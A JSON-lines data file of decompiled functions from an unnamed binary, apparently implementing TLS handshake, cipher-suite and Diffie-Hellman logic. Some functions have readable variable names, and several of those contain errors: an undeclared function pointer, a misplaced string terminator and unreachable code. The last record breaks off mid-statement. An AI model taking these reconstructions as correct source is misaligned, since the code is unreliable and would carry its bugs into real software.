{"Function Name": "FUN_0042acc0", "Address": "0042acc0", "Source Code": "undefined8 FUN_0042acc0(long inputAddress, undefined4 *outputValue)\n{\n    \n    if (outputValue == (undefined4 *)0x0) {\n        return 0; \n    }\n    \n    \n    if (inputAddress == 0) {\n        *outputValue = 0; \n        return 0; \n    }\n    \n    \n    uint retrievedValue = *(uint *)(inputAddress + 0x22428);\n    \n    \n    if (retrievedValue != 0) {\n        \n        time_t currentTime = time((time_t *)0x0);\n        \n        \n        if ((long)(ulong)retrievedValue < currentTime) {\n            *outputValue = 0; \n            return 0; \n        }\n        \n        \n        *(undefined4 *)(inputAddress + 0x22428) = 0;\n    }\n    \n    \n    *outputValue = *(undefined4 *)(inputAddress + 0x22398);\n    \n    \n    return *(undefined8 *)(inputAddress + 0x22390);\n}"}
{"Function Name": "FUN_0042ad40", "Address": "0042ad40", "Source Code": "long FUN_0042ad40(long inputAddress, uint *outputPointer, uint inputValue)\n{\n    long memoryValue; \n    time_t currentTime; \n    uint availableValue; \n    uint calculatedValue; \n    \n    if (outputPointer == (uint *)0x0) {\n        return 0; \n    }\n    \n    \n    if ((inputAddress != 0) && (memoryValue = *(long *)(inputAddress + 0x22390), memoryValue != 0) &&\n        (availableValue = *(uint *)(inputAddress + 0x22398), inputValue < availableValue)) {\n        \n        calculatedValue = *(uint *)(inputAddress + 0x22428); \n        \n        if (calculatedValue != 0) {\n            currentTime = time((time_t *)0x0); \n            \n            if ((long)(ulong)calculatedValue < currentTime) {\n                goto LAB_0042adc8; \n            }\n            *(undefined4 *)(inputAddress + 0x22428) = 0; \n        }\n        \n        availableValue -= inputValue; \n        memoryValue += (ulong)inputValue; \n        \n        \n        if (*(char *)(inputAddress + 0x223c9) == '\\0') {\n            \n            if (availableValue < 5) {\n                goto LAB_0042adc8; \n            }\n            \n            calculatedValue = (ushort)(*(ushort *)(memoryValue + 3) >> 8 | *(ushort *)(memoryValue + 3) << 8) + 5;\n        } else {\n            \n            if (availableValue < 0xd) {\n                goto LAB_0042adc8; \n            }\n            \n            calculatedValue = (ushort)(*(ushort *)(memoryValue + 0xb) >> 8 | *(ushort *)(memoryValue + 0xb) << 8) + 0xd;\n        }\n        \n        \n        if (calculatedValue <= availableValue) {\n            *outputPointer = calculatedValue; \n            return memoryValue; \n        }\n    }\n    \nLAB_0042adc8:\n    *outputPointer = 0; \n    return 0; \n}"}
{"Function Name": "FUN_0042afb0", "Address": "0042afb0", "Source Code": "void * FUN_0042afb0(undefined input_value, short status_code)\n{\n    \n    void *allocated_memory = malloc(0x22430);\n    \n    \n    if (allocated_memory != (void *)0x0) {\n        \n        memset(allocated_memory, 0, 0x22430);\n        \n        \n        *(undefined *)((long)allocated_memory + 0x66) = input_value;\n        \n        \n        if (((ushort)(status_code + 0x104U) < 2) || (status_code == -0x101)) {\n            \n            *(undefined *)((long)allocated_memory + 0x223c9) = 1;\n        }\n        \n        \n        *(short *)((long)allocated_memory + 100) = status_code;\n    }\n    \n    \n    return allocated_memory;\n}"}
{"Function Name": "FUN_0042b3f0", "Address": "0042b3f0", "Source Code": "undefined8 FUN_0042b3f0(long input_value, void *comparison_string, byte length)\n{\n    long offset_value; \n    char *current_string;  \n    size_t current_length; \n    long index; \n    \n    if (input_value == 0) {\n        return 0;\n    }\n    \n    \n    if (comparison_string != (void *)0x0 && length != 0 && (offset_value = *(long *)(input_value + 0x22410), offset_value != 0) &&\n        (*(byte *)(input_value + 0x22418) != 0)) {\n        \n        index = 0; \n        \n        \n        while ((current_string = *(char **)(offset_value + index), current_string != (char *)0x0 &&\n                (current_length = strlen(current_string), (uint)length == (uint)current_length && \n                memcmp(current_string, comparison_string, (ulong)length) == 0))) { \n            index += 8; \n            \n            \n            if (index == (*(byte *)(input_value + 0x22418) - 1) * 8 + 8) {\n                return 0; \n            }\n        }\n        return 1; \n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042b4c0", "Address": "0042b4c0", "Source Code": "undefined4 FUN_0042b4c0(long input_handle, char *input_string)\n{\n    size_t input_length; \n    void *reallocated_memory; \n    undefined4 return_status; \n    \n    if (input_handle == 0 || input_string == (char *)0x0 || *input_string == '\\0' || \n        (*(char *)(input_handle + 0x66) != '\\0' && (*(char *)(input_handle + 0x223ac) != '\\0'))) {\n        return_status = 0xffffffff; \n    } else {\n        input_length = strlen(input_string); \n        \n        if (FUN_0042b3f0(input_handle, input_string, input_length & 0xff) == 0) {\n            \n            reallocated_memory = realloc(*(void **)(input_handle + 0x22410), (ulong)*(byte *)(input_handle + 0x22418) * 8 + 8);\n            *(void **)(input_handle + 0x22410) = reallocated_memory; \n            if (reallocated_memory == (void *)0x0) { \n                *(undefined *)(input_handle + 0x22418) = 0; \n                return_status = 0xfffffff7; \n            } else {\n                void * new_string = malloc((long)(input_length + 1)); \n                *(void **)((long)reallocated_memory + (ulong)*(byte *)(input_handle + 0x22418) * 8) = new_string; \n                if (new_string != (void *)0x0) { \n                    memcpy(new_string, input_string, (long)input_length); \n                    *(undefined *)((long)reallocated_memory + (long)input_length) = 0; \n                    *(char *)(input_handle + 0x22418) += 1; \n                    return 0; \n                }\n                return_status = 0xfffffff7; \n            }\n        } else {\n            return_status = 0; \n        }\n    }\n    return return_status; \n}"}
{"Function Name": "FUN_0042b760", "Address": "0042b760", "Source Code": "bool FUN_0042b760(long input_value, ushort threshold_value)\n{\n    \n    if (input_value == 0) {\n        return false; \n    }\n    \n    \n    if (threshold_value < 0xc015) {\n        \n        if (0xc012 < threshold_value) {\n            return true; \n        }\n        \n        \n        if (threshold_value == 0x6b) {\n            \n            return *(short *)(input_value + 100) == -0x103 || *(short *)(input_value + 100) == 0x303;\n        }\n        \n        \n        if (threshold_value < 0x6c) {\n            \n            if (threshold_value == 0x39 || threshold_value == 0x33) {\n                return true; \n            }\n            return threshold_value == 0x67; \n        }\n        \n        \n        if (threshold_value < 0x9e) {\n            return false; \n        }\n        \n        \n        if (threshold_value < 0xa0) {\n            \n            return *(short *)(input_value + 100) == -0x103 || *(short *)(input_value + 100) == 0x303;\n        }\n        \n        \n        return 1 > (ushort)(threshold_value + 0x3ff7);\n    } else {\n        \n        if (threshold_value < 0xc02d) {\n            \n            if (threshold_value < 0xc023) {\n                return false; \n            }\n            \n            if (0xc024 < threshold_value) {\n                \n                return threshold_value == 0xc027 && (*(short *)(input_value + 100) == -0x103 || *(short *)(input_value + 100) == 0x303);\n            }\n            \n            return (*(short *)(input_value + 100) == -0x103 || *(short *)(input_value + 100) == 0x303) && *(long *)(input_value + 0x68) != 0;\n        }\n        \n        \n        if (threshold_value == 0xcca8 || (threshold_value < 0xcca9 && 1 > (ushort)(threshold_value + 0x3fd1))) {\n            return true; \n        }\n        \n        \n        return threshold_value == 0xcca9 || threshold_value == 0xccaa;\n    }\n    \n    \n    return *(long *)(input_value + 0x68) != 0 && *(int *)(input_value + 0xb0) != 0;\n}"}
{"Function Name": "FUN_0042b8b0", "Address": "0042b8b0", "Source Code": "uint FUN_0042b8b0(long input_value, ushort *ushort_array, int array_length, undefined4 *output_value)\n{\n    uint result_value = 0xfffffffb; \n    long iteration_index; \n    if (output_value != (undefined4 *)0x0) { \n        *output_value = 0; \n    }\n    if (input_value == 0) { \n        return 0; \n    }\n    if (0 < array_length) { \n        for (ushort *ushort_pointer = ushort_array; ushort_pointer != ushort_array + (ulong)(array_length - 1U >> 1) + 1; ushort_pointer++) { \n            result_value = (uint)(ushort)(*ushort_pointer >> 8 | *ushort_pointer << 8); \n            if (FUN_0042b760(input_value, result_value) != 0) { \n                goto LAB_0042b925; \n            }\n        }\n    }\nLAB_0042b925: \n    iteration_index = 0; \n    while ((int)iteration_index < array_length) { \n        if ((ushort)(*(ushort *)((long)ushort_array + iteration_index) >> 8 | *(ushort *)((long)ushort_array + iteration_index) << 8) == 0x5600) { \n            if (output_value != (undefined4 *)0x0) { \n                *output_value = 1; \n            }\n            if (result_value != 0xfffffffb) { \n                return result_value; \n            }\n        }\n        iteration_index += 2; \n    }\n    return result_value; \n}"}
{"Function Name": "FUN_0042bce0", "Address": "0042bce0", "Source Code": "undefined8 FUN_0042bce0(long input_value, ulong *output_pointer, long function_param)\n{\n    \n    if (input_value == 0) {\n        return 0xffffffff; \n    }\n    \n    \n    if (output_pointer != (ulong *)0x0 && function_param != 0) {\n        \n        ulong result_value = (*function_pointer)(*(undefined8 *)(function_param + 0x10));\n        \n        \n        if (result_value <= *output_pointer) {\n            *output_pointer = result_value; \n            return 0; \n        }\n    }\n    \n    \n    return 0xffffffff;\n}"}
{"Function Name": "FUN_0042c700", "Address": "0042c700", "Source Code": "void FUN_0042c700(long base_address)\n{\n    \n    *(undefined2 *)(base_address + 0x223ca) = 0;\n    \n    \n    *(undefined2 *)(base_address + 0x223cc) = 0;\n    \n    \n    *(undefined *)(base_address + 0x223d9) = 0;\n    \n    \n    void **pointer_to_void = (void **)(base_address + 0x22360);\n    \n    \n    if (*pointer_to_void != (void *)0x0) {\n        \n        free(*pointer_to_void);\n    }\n    \n    \n    *pointer_to_void = 0;\n    \n    \n    *(undefined *)(base_address + 0x22388) = 0;\n}"}
{"Function Name": "FUN_0042c750", "Address": "0042c750", "Source Code": "ulong FUN_0042c750(long input_address,long data_address,int threshold,undefined4 *output_value)\n{\n    ulong return_value; \n    void *allocated_memory; \n    uint size_value; \n    byte byte_value; \n    *output_value = 0; \n    \n    if ((*(char *)(input_address + 0x22388) == '\\0') && (*(char *)(input_address + 0x223c9) != '\\0')) {\n        \n        if (10 < threshold) {\n            return_value = FUN_00405c50(data_address); \n            \n            if ((int)return_value < 0) {\n                return return_value; \n            }\n            \n            if ((int)return_value <= threshold - 0xb) {\n                byte_value = *(byte *)(data_address + 0xd); \n                \n                if (*(void **)(input_address + 0x223d0) != (void *)0x0) {\n                    free(*(void **)(input_address + 0x223d0));\n                }\n                *(undefined *)(input_address + 0x223d8) = 0; \n                \n                if (byte_value == 0) {\n                    size_value = 0xe; \n                    FUN_0042c700(input_address); \n                    return (ulong)size_value; \n                }\n                \n                if (((int)(uint)byte_value <= threshold - 0xe) && (0xd < threshold)) {\n                    allocated_memory = malloc((ulong)byte_value); \n                    *(void **)(input_address + 0x223d0) = allocated_memory; \n                    \n                    if (allocated_memory == (void *)0x0) {\n                        return 0xfffffff7; \n                    }\n                    *(byte *)(input_address + 0x223d8) = byte_value; \n                    size_value = byte_value + 0xe; \n                    memcpy(allocated_memory, (void *)(data_address + 0xe), (ulong)byte_value); \n                    *output_value = 4; \n                    FUN_0042c700(input_address); \n                    return (ulong)size_value; \n                }\n            }\n        }\n    }\n    return 0xfffffffa; \n}"}
{"Function Name": "FUN_0042c8f0", "Address": "0042c8f0", "Source Code": "int FUN_0042c8f0(long input_param, ushort *ushort_array, int threshold)\n{\n    \n    int status_value = FUN_0042b990();\n    ushort swapped_value;\n    uint casted_value;\n    int adjusted_value;\n    \n    if ((status_value == 2 && threshold < 1) || (status_value != 2 && threshold < 2)) {\n        return 0; \n    }\n    \n    adjusted_value = (status_value == 2) ? 2 : 1;\n    \n    swapped_value = (status_value == 2) ? (*ushort_array >> 8 | *ushort_array << 8) : (ushort)*(byte *)ushort_array;\n    casted_value = (uint)swapped_value; \n    \n    if ((int)casted_value <= threshold - adjusted_value && threshold - adjusted_value > -1) {\n        uint allocated_size = 0; \n        void *memory_pointer; \n        \n        if (status_value == 1) {\n            memory_pointer = (void *)FUN_0042c200(input_param, (byte *)((long)adjusted_value + (long)ushort_array), casted_value, &allocated_size, 1);\n        } else if (status_value == 2) {\n            memory_pointer = (void *)FUN_0042b170(input_param, (byte *)((long)adjusted_value + (long)ushort_array), casted_value, &allocated_size, 1);\n        } else {\n            memory_pointer = (void *)FUN_00429f20(input_param, (byte *)((long)adjusted_value + (long)ushort_array), casted_value, &allocated_size);\n        }\n        \n        if (memory_pointer != (void *)0x0) {\n            \n            if (allocated_size > 2) {\n                \n                if (*(void **)(input_param + 200) != (void *)0x0) {\n                    free(*(void **)(input_param + 200));\n                }\n                \n                *(void **)(input_param + 200) = memory_pointer;\n                *(uint *)(input_param + 0xd0) = allocated_size;\n                \n                FUN_00429d90(input_param, 0x30);\n                return adjusted_value + casted_value; \n            }\n            free(memory_pointer); \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042d750", "Address": "0042d750", "Source Code": "ulong FUN_0042d750(char inputChar, long inputLong, undefined8 inputData, int inputSize, long inputPointer, int inputLength,\n                   undefined8 inputKey, uint hashType, undefined8 outputData) {\n    undefined4 hashAlgorithm; \n    int processResult; \n    uint manipulatedBytes; \n    uint upperBytes; \n    long calculatedAddress; \n    undefined8 processedData; \n    ulong finalResult; \n    undefined dataBuffer[568]; \n    \n    if (hashType == 0x14) {\n        hashAlgorithm = FUN_00414210(&DAT_00437669); \n    } else if (hashType == 0x30) {\n        hashAlgorithm = FUN_00414210(\"sha384\"); \n    } else {\n        hashAlgorithm = FUN_00414210(\"sha256\"); \n    }\n    \n    calculatedAddress = inputLong + (inputChar == '\\0' ? 0x22328 : 0x222f8);\n    \n    \n    processResult = FUN_004227f0(dataBuffer, hashAlgorithm, calculatedAddress, (long)(int)hashType);\n    if (processResult == 0) {\n        \n        if (*(char *)(inputLong + 0x223c9) == '\\0') {\n            outputData = *(undefined8 *)(inputLong + (inputChar == '\\0' ? 0x22378 : 0x22380));\n        }\n        \n        \n        manipulatedBytes = (uint)outputData >> 0x18 | ((uint)outputData & 0xff0000) >> 8 |\n                ((uint)outputData & 0xff00) << 8 | (uint)outputData << 0x18;\n        upperBytes = (uint)((ulong)outputData >> 0x20);\n        \n        \n        processedData = CONCAT44(manipulatedBytes, upperBytes >> 0x18 | (upperBytes & 0xff0000) >> 8 | (upperBytes & 0xff00) << 8 | upperBytes << 0x18);\n        \n        \n        if ((FUN_00422a50(dataBuffer, &processedData, 8) == 0) &&\n            (FUN_00422a50(dataBuffer, inputData, (long)inputSize) == 0) &&\n            (inputPointer == 0 || (inputLength == 0 || (FUN_00422a50(dataBuffer, inputPointer, (long)inputLength) == 0))))) {\n            \n            finalResult = (ulong)hashType; \n            \n            \n            if (FUN_00422af0(dataBuffer, inputKey, &finalResult) == 0) {\n                return finalResult & 0xffffffff; \n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042e220", "Address": "0042e220", "Source Code": "long * FUN_0042e220(undefined8 *param_1,int param_2)\n{\nuint uVar1;\nshort sVar2;\nushort uVar3;\nundefined8 uVar4;\nundefined4 uVar5;\nint iVar6;\nint iVar7;\nlong *__ptr;\nsize_t sVar8;\nundefined8 *__ptr_00;\nulong uVar9;\nundefined uVar10;\nbool bVar11;\nchar *__s;\nchar *pcVar12;\nulong *local_3078;\nundefined local_305b;\nundefined local_305a;\nundefined local_3059;\nundefined local_3058 [8];\nundefined8 local_3050;\nundefined8 local_3048;\nundefined8 local_3040;\nundefined local_3038 [4096];\nulong local_2038 [512];\nundefined local_1038 [4104];\nif (*(char *)((long)param_1 + 0x66) == '\\0') {\nreturn (long *)0x0;\n}\n__ptr = (long *)FUN_00428040(param_1,0x16,*(undefined2 *)((long)param_1 + 100),0);\nlocal_305b = 0xc;\nFUN_00428240(__ptr,&local_305b,1);\nFUN_00428240(__ptr,local_3058,3);\nif (*(char *)((long)param_1 + 0x223c9) == '\\0') {\niVar7 = *(int *)(__ptr + 1);\nif (param_2 != 1) goto LAB_0042e28e;\nLAB_0042e2ce:\nif (DAT_006698df == '\\0') {\nFUN_00428410();\n}\nFUN_0042bed0(param_1);\npcVar12 = (char *)param_1[0x13];\n__s = (char *)param_1[0x12];\nif ((pcVar12 == (char *)0x0) || (__s == (char *)0x0)) {\nuVar9 = 0x100;\npcVar12 =\n\"3FB32C9B73134D0B2E77506660EDBD484CA7B18F21EF205407F4793A1A0BA12510DBC15077BE463FFF4FED4AAC0BB555BE3A6C1B0C6B47B1BC3773BF7E8C6F62901228F8C28CBB18A55AE31341000A650196F931C77A57F2DDF463E5E9EC144B777DE62AAAB8A8628AC376D282D6ED3864E67982428EBC831D14348F6F2F9193B5045AF2767164E1DFC967C1FB3F2E55A4BD1BFFE83B9C80D052B985D182EA0ADB2A3B7313D3FE14C8484B1E052588B9B7D2BBD2DF016199ECD06E1557CD0915B3353BBB64E0EC377FD028370DF92B52C7891428CDC67EB6184B523D1DB246C32F63078490F00EF8D647D148D47954515E2327CFEF98C582664B4C0F6CC41659\"\n;\n__s =\n\"87A8E61DB4B6663CFFBBD19C651959998CEEF608660DD0F25D2CEED4435E3B00E00DF8F1D61957D4FAF7DF4561B2AA3016C3D91134096FAA3BF4296D830E9A7C209E0C6497517ABD5A8A9D306BCF67ED91F9E6725B4758C022E0B1EF4275BF7B6C5BFC11D45F9088B941F54EB1E59BB8BC39A0BF12307F5C4FDB70C581B23F76B63ACAE1CAA6B7902D52526735488A0EF13C6D9A51BFA4AB3AD8347796524D8EF6A167B5A41825D967E144E5140564251CCACB83E6B486F6B3CA3F7971506026C0B857F689962856DED4010ABD0BE621C3A3960A54E710C375F26375D7014103A4B54330C198AF126116D2276E11715F693877FAD7EF09CADB094AE91E1A1597\"\n;\n}\nelse {\nsVar8 = strlen(__s);\nuVar9 = sVar8 & 0xffffffff;\n}\niVar6 = FUN_0042c380(uVar9,param_1[0x10],__s,pcVar12,0,0);\nif (iVar6 != 0) {\nfree(__ptr);\nif ((void *)param_1[0x10] != (void *)0x0) {\nfree((void *)param_1[0x10]);\n}\nparam_1[0x10] = 0;\nreturn (long *)0x0;\n}\nlocal_3050 = 0xfff;\nlocal_3048 = 0xfff;\nlocal_3040 = 0xfff;\niVar6 = FUN_0042bd30(local_2038,&local_3050,local_1038,&local_3048,local_3038,&local_3040,\nparam_1[0x10]);\nif (iVar6 != 0) {\nLAB_0042e298:\nfree(__ptr);\nreturn (long *)0x0;\n}\nFUN_00428330(__ptr,local_3050 & 0xffff);\nFUN_00428240(__ptr,local_2038,local_3050 & 0xffffffff);\nFUN_00428330(__ptr,local_3048 & 0xffff);\nFUN_00428240(__ptr,local_1038,local_3048 & 0xffffffff);\nFUN_00428330(__ptr,local_3040 & 0xffff);\nFUN_00428240(__ptr,local_3038,local_3040 & 0xffffffff);\n}\nelse {\nFUN_0042c5e0(param_1,__ptr,0);\niVar7 = *(int *)(__ptr + 1);\nif (param_2 == 1) goto LAB_0042e2ce;\nLAB_0042e28e:\nif (param_2 != 6) goto LAB_0042e298;\nif (param_1[0x14] == 0) {\nparam_1[0x14] = &DAT_00649380;\n}\nlocal_305a = 3;\nFUN_00428240(__ptr,&local_305a,1);\nFUN_00428330(__ptr,*(undefined2 *)(param_1[0x14] + 4));\nif (DAT_006698df == '\\0') {\nFUN_00428410();\n}\nFUN_0042b280(param_1);\nuVar4 = param_1[0x11];\nuVar5 = FUN_00414410(\"sprng\");\niVar6 = FUN_0041c770(0,uVar5,uVar4);\nif (iVar6 != 0) {\nif ((void *)param_1[0x11] != (void *)0x0) {\nfree((void *)param_1[0x11]);\n}\nparam_1[0x11] = 0;\nfree(__ptr);\nreturn (long *)0x0;\n}\nlocal_2038[0] = 0x800;\niVar6 = FUN_00420610(param_1[0x11],local_1038,local_2038);\nif (iVar6 != 0) goto LAB_0042e298;\nlocal_3059 = (undefined)local_2038[0];\nFUN_00428240(__ptr,&local_3059,1);\nFUN_00428240(__ptr,local_1038,local_2038[0] & 0xffffffff);\n}\nlocal_3078 = local_2038;\niVar6 = *(int *)(__ptr + 1);\nuVar1 = (iVar6 - iVar7) + 0x40;\n__ptr_00 = (undefined8 *)malloc((ulong)uVar1);\nif (__ptr_00 == (undefined8 *)0x0) goto LAB_0042e5e1;\nsVar2 = *(short *)((long)param_1 + 100);\nlocal_2038[0] = 0x800;\nif ((sVar2 == -0x104) || (sVar2 == 0x304)) {\nuVar10 = 4;\nbVar11 = sVar2 == -0x104 || sVar2 == 0x304;\nif ((sVar2 != -0x104 && sVar2 != 0x304) && ((sVar2 != 0x303 && (uVar10 = 2, sVar2 == -0x103))))\ngoto LAB_0042e860;\nLAB_0042e6dd:\nuVar3 = *(ushort *)((long)param_1 + 0x62);\nif (uVar3 < 0xc025) {\nif ((0xc022 < uVar3) || ((ushort)(uVar3 + 0x3ff7) < 2)) {\nLAB_0042e74d:\nif ((bVar11) || (sVar2 == 0x303)) {\nuVar10 = 6;\n}\nelse if (sVar2 == -0x103) {\nuVar10 = 6;\n}\nlocal_3050 = CONCAT71(local_3050._1_7_,uVar10);\nFUN_00428240(__ptr,&local_3050,1);\nlocal_3048 = CONCAT71(local_3048._1_7_,3);\nFUN_00428240(__ptr,&local_3048,1);\ngoto LAB_0042e53e;\n}\n}\nelse if ((0xc02a < uVar3) && ((uVar3 < 0xc02d || (uVar3 == 0xcca9)))) goto LAB_0042e74d;\nlocal_3040 = CONCAT71(local_3040._1_7_,uVar10);\nFUN_00428240(__ptr,&local_3040,1);\nlocal_3038[0] = 1;\nFUN_00428240(__ptr,local_3038,1);\n}\nelse if ((sVar2 == 0x303) || (uVar10 = 0xff, sVar2 == -0x103)) {\nLAB_0042e860:\nbVar11 = false;\nuVar10 = 4;\ngoto LAB_0042e6dd;\n}\nLAB_0042e53e:\n*__ptr_00 = *param_1;\n__ptr_00[1] = param_1[1];\n__ptr_00[2] = param_1[2];\n__ptr_00[3] = param_1[3];\n__ptr_00[4] = param_1[4];\n__ptr_00[5] = param_1[5];\n__ptr_00[6] = param_1[6];\n__ptr_00[7] = param_1[7];\nmemcpy(__ptr_00 + 8,(void *)((long)iVar7 + *__ptr),(ulong)(uint)(iVar6 - iVar7));\nuVar3 = *(ushort *)((long)param_1 + 0x62);\nif (uVar3 < 0xc025) {\nif ((uVar3 < 0xc023) && (1 < (ushort)(uVar3 + 0x3ff7))) goto LAB_0042e5b5;\nLAB_0042e7dc:\niVar6 = FUN_00428f60(param_1,uVar10,__ptr_00,uVar1,local_1038,local_3078);\n}\nelse {\nif ((0xc02a < uVar3) && ((uVar3 < 0xc02d || (uVar3 == 0xcca9)))) goto LAB_0042e7dc;\nLAB_0042e5b5:\niVar6 = FUN_00428af0(param_1,uVar10,__ptr_00,uVar1,local_1038,local_3078);\n}\nif (iVar6 == 1) {\nFUN_00428330(__ptr,local_2038[0] & 0xffff);\nFUN_00428240(__ptr,local_1038,local_2038[0] & 0xffffffff);\n}\nfree(__ptr_00);\nLAB_0042e5e1:\nif (*(char *)(__ptr + 2) != '\\0') {\nreturn __ptr;\n}\nif (*__ptr != 0) {\niVar7 = *(int *)(__ptr + 1) - iVar7;\nuVar9 = -(ulong)(*(char *)((long)param_1 + 0x223c9) == '\\0') & 0xfffffffffffffff8;\niVar6 = iVar7 + 0xffff;\nif (-1 < iVar7) {\niVar6 = iVar7;\n}\n*(char *)(*__ptr + 0xe + uVar9) = (char)((uint)iVar6 >> 0x10);\niVar7 = iVar7 % 0x10000;\niVar6 = iVar7 + 0xff;\nif (-1 < iVar7) {\niVar6 = iVar7;\n}\n*(char *)(*__ptr + 0xf + uVar9) = (char)((uint)iVar6 >> 8);\n*(char *)(*__ptr + 0x10 + uVar9) = (char)iVar7;\nif (*(char *)((long)param_1 + 0x223c9) != '\\0') {\n*(undefined *)(*__ptr + 0x16) = *(undefined *)(*__ptr + 0xe);\n*(undefined *)(*__ptr + 0x17) = *(undefined *)(*__ptr + 0xf);\n*(undefined *)(*__ptr + 0x18) = *(undefined *)(*__ptr + 0x10);\n*(char *)((long)param_1 + 0x223d9) = *(char *)((long)param_1 + 0x223d9) + '\\x01';\n}\nif (*(char *)(__ptr + 2) != '\\0') {\nreturn __ptr;\n}\n}\nFUN_0042d8f0(__ptr);\nreturn __ptr;\n}\nLocal Variable: local_1038 : undefined1\nLocal Variable: local_2038 : undefined8\nLocal Variable: local_3038 : undefined1\nLocal Variable: local_3040 : undefined8\nLocal Variable: local_3048 : undefined8\nLocal Variable: local_3050 : undefined8\nLocal Variable: local_3058 : undefined1\nLocal Variable: local_3059 : undefined1\nLocal Variable: local_305a : undefined1\nLocal Variable: local_305b : undefined1\nLocal Variable: local_306c : undefined4\nLocal Variable: local_3070 : undefined4\nLocal Variable: local_3078 : undefined8\nLocal Variable: local_3088 : undefined8"}
{"Function Name": "FUN_0042e8f0", "Address": "0042e8f0", "Source Code": "long * FUN_0042e8f0(long param_1,int param_2)\n{\nbyte bVar1;\nundefined2 uVar2;\nchar *pcVar3;\nint iVar4;\nlong *plVar5;\ntime_t tVar6;\nsize_t sVar7;\nulong uVar8;\nshort sVar9;\nint iVar10;\nuint uVar11;\nlong lVar12;\nlong lVar13;\nint iVar14;\nundefined local_53;\nundefined local_52;\nundefined local_51;\nundefined local_50;\nundefined local_4f;\nundefined local_4e;\nundefined local_4d;\nundefined local_4c;\nundefined local_4b;\nundefined local_4a;\nundefined local_49;\nundefined local_48 [24];\nif (DAT_006698df == '\\0') {\nFUN_00428410();\n}\niVar4 = FUN_004283b0(param_1 + 0x20,0x20);\nif (iVar4 == 0) {\nreturn (long *)0x0;\n}\nif (*(char *)(param_1 + 0x66) == '\\0') {\ntVar6 = time((time_t *)0x0);\nuVar11 = (uint)tVar6;\n*(uint *)(param_1 + 0x20) =\nuVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 << 0x18;\nif (*(char *)(param_1 + 0x66) != '\\0') goto LAB_0042e933;\n}\nelse {\nLAB_0042e933:\nif (param_2 != 0) {\nif ((param_2 == 0xfefd) || (param_2 == 0x303)) {\n*(undefined8 *)(param_1 + 0x38) = 0x14452474e574f44;\n}\nelse {\n*(undefined8 *)(param_1 + 0x38) = 0x4452474e574f44;\n}\n}\n}\nuVar2 = *(undefined2 *)(param_1 + 100);\nplVar5 = (long *)FUN_00428040(param_1,0x16,uVar2);\nif (plVar5 == (long *)0x0) {\nreturn (long *)0x0;\n}\nif (*(char *)(param_1 + 0x66) == '\\0') {\nlocal_52 = 1;\nFUN_00428240(plVar5,&local_52,1);\n}\nelse {\nlocal_53 = 2;\nFUN_00428240(plVar5,&local_53,1);\n}\nFUN_00428240(plVar5,local_48,3);\nif (*(char *)(param_1 + 0x223c9) != '\\0') {\nFUN_0042c5e0(param_1,plVar5,0);\n}\niVar4 = *(int *)(plVar5 + 1);\nFUN_00428330(plVar5,uVar2);\nFUN_00428240(plVar5,param_1 + 0x20,0x20);\nFUN_0042c640(param_1);\nlocal_51 = *(undefined *)(param_1 + 0x60);\nFUN_00428240(plVar5,&local_51,1);\nif (*(char *)(param_1 + 0x60) != '\\0') {\nFUN_00428240(plVar5,param_1 + 0x40);\n}\nif (*(char *)(param_1 + 0x66) != '\\0') {\nif (*(char **)(param_1 + 0x22420) == (char *)0x0) {\niVar10 = 0;\nuVar11 = 0;\niVar14 = 0;\n}\nelse {\nsVar7 = strlen(*(char **)(param_1 + 0x22420));\niVar10 = (int)sVar7;\nuVar11 = iVar10 + 1;\niVar14 = iVar10 + 7;\n}\nsVar9 = *(short *)(param_1 + 0x62);\nif (sVar9 == 0) {\nsVar9 = 0x33;\n*(undefined2 *)(param_1 + 0x62) = 0x33;\n}\nFUN_00428330(plVar5,sVar9);\nlocal_50 = 0;\nFUN_00428240(plVar5,&local_50,1);\nif (((ushort)(*(short *)(param_1 + 100) + 0x104U) < 2) ||\n((ushort)(*(short *)(param_1 + 100) - 0x303U) < 2)) {\nFUN_00428330(plVar5,iVar14 + 5U & 0xffff);\nFUN_00428330(plVar5,0xff01);\nFUN_00428330(plVar5,1);\nlocal_4f = 0;\nFUN_00428240(plVar5,&local_4f,1);\nif (uVar11 != 0) {\nFUN_00428330(plVar5,0x10);\nFUN_00428330(plVar5,(short)uVar11 + 2);\nFUN_00428330(plVar5,uVar11 & 0xffff);\nlocal_4e = (undefined)iVar10;\nFUN_00428240(plVar5,&local_4e,1);\nFUN_00428240(plVar5,*(undefined8 *)(param_1 + 0x22420),iVar10);\n}\n}\ngoto LAB_0042eb20;\n}\nbVar1 = *(byte *)(param_1 + 0x22418);\nif (bVar1 == 0) {\nuVar11 = 0;\niVar10 = 0;\n}\nelse {\nlVar13 = *(long *)(param_1 + 0x22410);\nlVar12 = 0;\nuVar11 = 0;\ndo {\npcVar3 = *(char **)(lVar13 + lVar12);\nif (pcVar3 != (char *)0x0) {\nsVar7 = strlen(pcVar3);\nif ((int)sVar7 != 0) {\nuVar11 = uVar11 + 1 + (int)sVar7;\n}\n}\nlVar12 = lVar12 + 8;\n} while (lVar12 != (ulong)(bVar1 - 1) * 8 + 8);\niVar10 = 0;\nif (uVar11 != 0) {\niVar10 = uVar11 + 6;\n}\n}\nif (*(char *)(param_1 + 0x223c9) != '\\0') {\nlocal_4d = *(undefined *)(param_1 + 0x223d8);\nFUN_00428240(plVar5,&local_4d,1);\nif (*(char *)(param_1 + 0x223d8) != '\\0') {\nFUN_00428240(plVar5,*(undefined8 *)(param_1 + 0x223d0));\n}\n}\nif ((*(short *)(param_1 + 100) == -0x103) || (*(short *)(param_1 + 100) == 0x303)) {\nFUN_00428330(plVar5,0x16);\nFUN_00428330(plVar5,0xc02f);\nFUN_00428330(plVar5,0xc013);\nFUN_00428330(plVar5,0xc014);\nFUN_00428330(plVar5,0xc027);\nFUN_00428330(plVar5,0xcca8);\nFUN_00428330(plVar5,0x9e);\nFUN_00428330(plVar5,0x6b);\nFUN_00428330(plVar5,0x67);\nFUN_00428330(plVar5,0x39);\nFUN_00428330(plVar5,0x33);\nFUN_00428330(plVar5,0xccaa);\n}\nelse {\nFUN_00428330(plVar5,10);\nFUN_00428330(plVar5,0xc013);\nFUN_00428330(plVar5,0xc014);\nFUN_00428330(plVar5,0x39);\nFUN_00428330(plVar5,0x39);\nFUN_00428330(plVar5,0x33);\n}\nlocal_4c = 1;\nFUN_00428240(plVar5,&local_4c,1);\nlocal_4b = 